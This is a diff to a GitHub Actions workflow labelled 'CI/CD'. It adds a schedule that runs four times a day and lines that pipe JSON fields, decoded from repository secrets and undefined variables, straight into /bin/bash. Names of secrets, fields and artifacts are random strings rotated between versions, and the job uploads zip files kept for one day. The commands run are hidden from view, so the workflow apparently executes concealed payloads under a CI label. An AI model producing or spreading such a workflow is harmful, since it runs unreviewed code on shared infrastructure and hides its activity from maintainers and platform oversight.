@@ -2,6 +2,8 @@ name: CI/CD
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '46 1,7,13,19 * * *'
 permissions:
   contents: read
 concurrency:
@@ -15,14 +17,16 @@ jobs:
       - uses: actions/checkout@v4
       - name: Launch
         env:
-          fib741: ${{ secrets.fib741 }}
+          j36138: ${{ secrets.j36138 }}
         run: |
-          printf '%s' "$fib741" | jq -r .rxa897 | /bin/bash
-          echo $fmca7735 | jq -r .mhmlb66478 | /bin/bash
+          printf '%s' "$j36138" | jq -r .qtn71 | /bin/bash
+          printf '%s' "$jcle9" | jq -r .w930 | /bin/bash
+          echo $a7 | jq -r .d248 | /bin/bash
+          echo $ngy9568 | jq -r .ti6452 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
         with:
-          name: 7Z6JrLjK
+          name: O2eF04pO
           path: "*.zip"
           retention-days: 1
